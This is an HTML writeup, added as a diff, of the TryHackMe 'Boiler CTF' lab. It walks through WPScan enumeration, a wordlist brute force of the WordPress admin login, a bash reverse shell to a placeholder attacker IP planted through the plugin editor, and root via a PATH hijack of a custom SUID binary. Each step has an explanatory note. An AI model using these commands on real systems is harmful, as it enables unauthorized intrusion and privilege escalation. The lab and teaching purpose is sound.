@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Boiler CTF: WordPress plugin RCE to a SUID binary root shell</title>
+  <meta name="description" content="A TryHackMe Boiler CTF walkthrough: brute-forcing a WordPress login, exploiting a vulnerable plugin for code execution, and escalating to root through a custom SUID binary with a hijackable PATH.">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Source+Sans+3:wght@400;500;600;700&display=swap">
+  <link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+<div class="page">
+
+  <div class="eyebrow"><a href="../index.html">&larr; Writeups</a> &middot; TryHackMe</div>
+  <h1>Boiler CTF: WordPress plugin RCE to a SUID binary root shell</h1>
+  <p class="dek">A WordPress login brute-forced, a vulnerable plugin turned into a reverse shell, and root reached through a custom SUID binary that trusts whatever's first on the PATH.</p>
+
+  <div class="meta-row">
+    <span class="pill">Room: Boiler CTF</span>
+    <span class="pill">Category: Web / Linux Privesc</span>
+    <span class="pill">Tools: WPScan, Gobuster, John the Ripper</span>
+  </div>
+
+  <div class="brief">
+    <p><strong>The setup:</strong> a WordPress site with a weak admin password and an outdated plugin. The job: get a shell through the application layer, then find a path from a low-privilege web user to root.</p>
+  </div>
+
+  <section>
+    <h2 class="section-title">The Investigation</h2>
+    <div class="steps">
+
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-body">
+          <div class="step-title">Enumerate the WordPress install</div>
+          <p><code>wpscan</code> against the site enumerates the theme, plugin list, and usernames. One installed plugin is a known-vulnerable version with a public code-execution advisory.</p>
+          <pre><code>wpscan --url http://&lt;target&gt; -e vp,u</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>WordPress's plugin ecosystem is its biggest attack surface, far more than WordPress core itself. Enumerating installed plugins and matching their versions against known CVEs is usually faster than looking for a novel bug.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-body">
+          <div class="step-title">Brute-force the admin login</div>
+          <p>With a valid username in hand, <code>wpscan</code>'s password-brute-force mode against a common wordlist finds a weak admin password in short order.</p>
+          <pre><code>wpscan --url http://&lt;target&gt; -U admin -P /usr/share/wordlists/rockyou.txt</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>WordPress doesn't rate-limit login attempts by default. A weak password on an admin account with no additional protection is just a matter of wordlist size and time.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-body">
+          <div class="step-title">Turn admin access into code execution</div>
+          <p>Logged in as admin, the WordPress theme/plugin editor accepts arbitrary PHP. Dropping a one-line reverse shell into an active plugin file and triggering it (loading the corresponding page) executes it on the server.</p>
+          <pre><code>exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;attacker-ip&gt;/4444 0&gt;&amp;1'");</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>The plugin editor is, by design, a way for an admin to run arbitrary server-side code, that's indistinguishable from a code-execution vulnerability once an attacker has those credentials. Admin access to WordPress is effectively a shell waiting to happen.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-body">
+          <div class="step-title">Enumerate for privilege escalation</div>
+          <p>As the low-privilege web server user, a hunt for SUID binaries turns up a custom, non-standard one sitting outside the usual system binary list.</p>
+          <pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre>
+          <p>Running it calls out to a system command (like <code>service</code> or similar) without an absolute path.</p>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A custom SUID binary is always worth more scrutiny than a stock one, someone wrote it for a reason, and homegrown binaries are far more likely to make a path-handling mistake than audited system tools.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="step">
+        <div class="step-num">5</div>
+        <div class="step-body">
+          <div class="step-title">Hijack the PATH for root</div>
+          <p>Writing a malicious file with the same name as the unqualified command the SUID binary calls, placing it in a writable directory, and prepending that directory to <code>PATH</code> before running the binary gets it executed instead, as root.</p>
+          <pre><code>echo '/bin/bash' &gt; /tmp/&lt;command&gt;
+chmod +x /tmp/&lt;command&gt;
+export PATH=/tmp:$PATH
+/path/to/suid-binary</code></pre>
+          <div class="notebook">
+            <span class="tag">Why this works</span>
+            <p>A SUID binary runs with the file owner's privileges, root, but still resolves unqualified commands through the calling user's PATH unless it hardcodes an absolute path. Controlling PATH means controlling what "runs" when the binary calls out.</p>
+          </div>
+        </div>
+      </div>
+
+    </div>
+  </section>
+
+  <section>
+    <h2 class="section-title">Full Attack Chain</h2>
+    <pre><code>wpscan: vulnerable plugin + valid username enumerated
+  &rarr; wpscan brute force: weak admin password found
+       &rarr; plugin editor: reverse shell planted and triggered
+            &rarr; find -perm -u=s: custom SUID binary with an unqualified PATH call
+                 &rarr; PATH hijack: malicious binary executed as root</code></pre>
+  </section>
+
+  <section>
+    <h2 class="section-title">Takeaways</h2>
+    <div class="skills">
+      <div class="skill">
+        <div class="skill-title">Plugins are WordPress's real attack surface</div>
+        <p>Enumerating installed plugins and checking their versions against known advisories is often faster than hunting for a new bug in WordPress core.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">Admin access equals code execution</div>
+        <p>The theme/plugin editor is a built-in path from "I have admin credentials" to "I have a shell," no additional vulnerability required.</p>
+      </div>
+      <div class="skill">
+        <div class="skill-title">Unqualified commands in SUID binaries are a classic privesc</div>
+        <p>Any privileged binary that calls another program by name instead of full path trusts the caller's PATH, and PATH is always attacker-controlled.</p>
+      </div>
+    </div>
+  </section>
+
+  <footer>tryhackme.com &middot; solved via WordPress exploitation and PATH-hijack privilege escalation</footer>
+
+</div>
+</body>
+</html>
